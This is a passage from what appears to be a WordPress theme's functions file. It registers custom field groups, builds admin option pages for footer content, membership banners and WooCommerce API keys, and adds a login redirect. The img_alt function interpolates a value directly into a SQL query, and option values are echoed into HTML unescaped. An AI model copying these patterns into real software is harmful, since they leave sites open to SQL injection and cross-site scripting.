				'type' => 'wysiwyg',
				'default_value' => '',
				'toolbar' => 'full',
				'media_upload' => 'yes',
			),
			array (
				'key' => 'field_5a5916ec35998',
				'label' => 'Acceptance text',
				'name' => 'acceptance_text_t2',
				'type' => 'text',
				'default_value' => '',
				'placeholder' => '',
				'prepend' => '',
				'append' => '',
				'formatting' => 'html',
				'maxlength' => '',
			),
			array (
				'key' => 'field_5a59171d35999',
				'label' => 'Text for "Continue with my order"',
				'name' => 'continue_my_order_t2',
				'type' => 'text',
				'default_value' => '',
				'placeholder' => '',
				'prepend' => '',
				'append' => '',
				'formatting' => 'html',
				'maxlength' => '',
			),
			array (
				'key' => 'field_5a59150f35992',
				'label' => 'Images of desktop',
				'name' => 'image_background_d_t2',
				'type' => 'image',
				'save_format' => 'url',
				'preview_size' => 'thumbnail',
				'library' => 'all',
			),
			array (
				'key' => 'field_5a5915c035993',
				'label' => 'Mobile image',
				'name' => 'image_background_m_t2',
				'type' => 'image',
				'save_format' => 'url',
				'preview_size' => 'thumbnail',
				'library' => 'all',
			),
		),
		'location' => array (
			array (
				array (
					'param' => 'post_type',
					'operator' => '==',
					'value' => 'product',
					'order_no' => 0,
					'group_no' => 0,
				),
				array (
					'param' => 'taxonomy',
					'operator' => '==',
					'value' => '31',
					'order_no' => 1,
					'group_no' => 0,
				),
			),
		),
		'options' => array (
			'position' => 'normal',
			'layout' => 'no_box',
			'hide_on_screen' => array (
			),
		),
		'menu_order' => 0,
	));
}

if(function_exists("register_field_group"))
{
	register_field_group(array (
		'id' => 'acf_what-you-receive-carousel',
		'title' => 'What You Receive Carousel',
		'fields' => array (
			array (
				'key' => 'field_5a65f2c4460e2',
				'label' => 'Image',
				'name' => 'image',
				'type' => 'image',
				'required' => 1,
				'save_format' => 'object',
				'preview_size' => 'thumbnail',
				'library' => 'all',
			),
		),
		'location' => array (
			array (
				array (
					'param' => 'post_type',
					'operator' => '==',
					'value' => 'tpc_what_you_receive',
					'order_no' => 0,
					'group_no' => 0,
				),
			),
		),
		'options' => array (
			'position' => 'normal',
			'layout' => 'no_box',
			'hide_on_screen' => array (
			),
		),
		'menu_order' => 0,
	));
}


/****************** Theme Option ******************/


function img_alt($image_src) {
    global $wpdb;
    $query = "SELECT post_title FROM {$wpdb->posts} WHERE guid='$image_src'";
    $alt = $wpdb->get_var($query);
    return $alt;
}

function tpc_theme_option() {
    ?>
    <link type="text/css" href="<?php echo get_template_directory_uri(); ?>/css/custom-admin.css" rel="stylesheet" />
    <div class='wrap tpc-titel'>
        <h2>Theme Option</h2>
    </div>
    <div class='tpc-content tpc-theme-option'>
        <p class="tpc-titel"><strong>Footer</strong></p>
        <form method="post" action="options.php">
            <?php wp_nonce_field('update-options') ?>
            <p><strong>Image url 1:</strong></p>
            <div class="tpc-img-content">
                <div class="tpc-img" style="background-image: url(<?php echo get_option('TPCfooterImg1'); ?>);"></div>
                <input type="url" name="TPCfooterImg1" value="<?php echo get_option('TPCfooterImg1'); ?>" />
            </div>
            <p><strong>Content Text 1:</strong><br />
            <textarea name="TPCfooterContentText1"><?php echo get_option('TPCfooterContentText1'); ?></textarea></p>
            <p><strong>Image url 2:</strong></p>
            <div class="tpc-img-content">
                <div class="tpc-img" style="background-image: url(<?php echo get_option('TPCfooterImg2'); ?>);"></div>
                <input type="url" name="TPCfooterImg2" value="<?php echo get_option('TPCfooterImg2'); ?>" />
            </div>
            <p><strong>Content Text 2:</strong><br />
            <textarea name="TPCfooterContentText2"><?php echo get_option('TPCfooterContentText2'); ?></textarea></p>
            <p><strong>Image url 3:</strong></p>
            <div class="tpc-img-content">
                <div class="tpc-img" style="background-image: url(<?php echo get_option('TPCfooterImg3'); ?>);"></div>
                <input type="url" name="TPCfooterImg3" value="<?php echo get_option('TPCfooterImg3'); ?>" />
            </div>
            <p><strong>Content Text 3:</strong><br />
            <textarea name="TPCfooterContentText3"><?php echo get_option('TPCfooterContentText3'); ?></textarea></p>
            <p><strong>Image url 4:</strong></p>
            <div class="tpc-img-content">
                <div class="tpc-img" style="background-image: url(<?php echo get_option('TPCfooterImg4'); ?>);"></div>
                <input type="url" name="TPCfooterImg4" value="<?php echo get_option('TPCfooterImg4'); ?>" />
            </div>
            <p><strong>Content Text 4:</strong><br />
            <textarea name="TPCfooterContentText4"><?php echo get_option('TPCfooterContentText4'); ?></textarea></p>

            <p><input type="submit" name="Submit" value="SAVE" /></p>
            <input type="hidden" name="action" value="update" />
            <input type="hidden" name="page_options" value="TPCfooterImg1,TPCfooterContentText1,TPCfooterImg2,TPCfooterContentText2,TPCfooterImg3,TPCfooterContentText3,TPCfooterImg4,TPCfooterContentText4" />
        </form>
        <p class="tpc-titel"><strong>Woocommerce API Key</strong></p>
        <form method="post" action="options.php">
            <?php wp_nonce_field('update-options') ?>
            <p><strong>Private Key:</strong></p>
            <input type="password" name="TPCprivateKey" value="<?php echo get_option('TPCprivateKey'); ?>" />
            <p><strong>Public key:</strong></p>
            <input type="password" name="TPCpublicKey" value="<?php echo get_option('TPCpublicKey'); ?>" />
            <p><input type="submit" name="Submit" value="SAVE" /></p>
            <input type="hidden" name="action" value="update" />
            <input type="hidden" name="page_options" value="TPCprivateKey,TPCpublicKey" />
        </form>
    </div>
    <?php
}

function tpc_shop_option() {
    ?>
    <link type="text/css" href="<?php echo get_template_directory_uri(); ?>/css/custom-admin.css" rel="stylesheet" />
    <div class='wrap tpc-titel'>
        <h2>Shop Option</h2>
    </div>
    <div class='tpc-content tpc-theme-option'>
        <?php
            $memberships = get_posts(array(
                'post_type' => 'wc_membership_plan',
                'posts_per_page' => -1,
                'order' => 'ASC'
            ));

            foreach ($memberships as $membership) {
                ?>
                    <p class="tpc-titel"><strong><?php echo $membership->post_title; ?> - Banner</strong></p>
                    <form method="post" action="options.php">
                        <?php wp_nonce_field('update-options') ?>
                        <p><strong>Desktop</strong></p>
                        <div class="tpc-img-content">
                            <div class="tpc-img" style="background-image: url(<?php echo get_option('TpcShop'.$membership->post_name.'DesktopUrl'); ?>);"></div>
                            <p><strong>Url:</strong></p>
                            <input type="url" name="TpcShop<?php echo $membership->post_name; ?>DesktopUrl" value="<?php echo get_option('TpcShop'.$membership->post_name.'DesktopUrl'); ?>" />
                            <p><strong>Alt:</strong></p>
                            <input type="text" name="TpcShop<?php echo $membership->post_name; ?>DesktopAlt" value="<?php echo get_option('TpcShop'.$membership->post_name.'DesktopAlt'); ?>" />
                        </div>
                        <p><strong>Mobile</strong></p>
                        <div class="tpc-img-content">
                            <div class="tpc-img" style="background-image: url(<?php echo get_option('TpcShop'.$membership->post_name.'MobileUrl'); ?>);"></div>
                            <p><strong>Url:</strong></p>
                            <input type="url" name="TpcShop<?php echo $membership->post_name; ?>MobileUrl" value="<?php echo get_option('TpcShop'.$membership->post_name.'MobileUrl'); ?>" />
                            <p><strong>Alt:</strong></p>
                            <input type="text" name="TpcShop<?php echo $membership->post_name; ?>MobileAlt" value="<?php echo get_option('TpcShop'.$membership->post_name.'MobileAlt'); ?>" />
                        </div>
                        <p><input type="submit" name="Submit" value="SAVE" /></p>
                        <input type="hidden" name="action" value="update" />
                        <input type="hidden" name="page_options" value="TpcShop<?php echo $membership->post_name; ?>DesktopUrl,TpcShop<?php echo $membership->post_name; ?>DesktopAlt,TpcShop<?php echo $membership->post_name; ?>MobileUrl,TpcShop<?php echo $membership->post_name; ?>MobileAlt" />
                    </form>
                <?php
                
            }
        ?>
    </div>
    <?php
}

function tpc_theme_option_edit() {

    //this is the main item for the menu
    add_menu_page('Theme Option', //page title
        'Theme Option', //menu title
        'manage_options', //capabilities
        'tpc_theme_option', //menu slug
        'tpc_theme_option' //function
    );

    //this is a submenu
	add_submenu_page('tpc_theme_option', //parent slug
        'Shop Option', //page title
        'Shop Option', //menu title
        'manage_options', //capability
        'tpc_shop_option', //menu slug
        'tpc_shop_option' //function
    );
}

add_action('admin_menu','tpc_theme_option_edit');

function tpc_redirect() {
    $url = $_SERVER["REQUEST_URI"];
    $string_value = 'my-account';
    $strpos = strpos($url, $string_value);

    if ( $strpos and is_user_logged_in()) {
        $url = home_url('/admin/#/admin/dashboard');
        wp_redirect( $url, 302 );
        exit();
    }
}
add_action( 'template_redirect', 'tpc_redirect' );
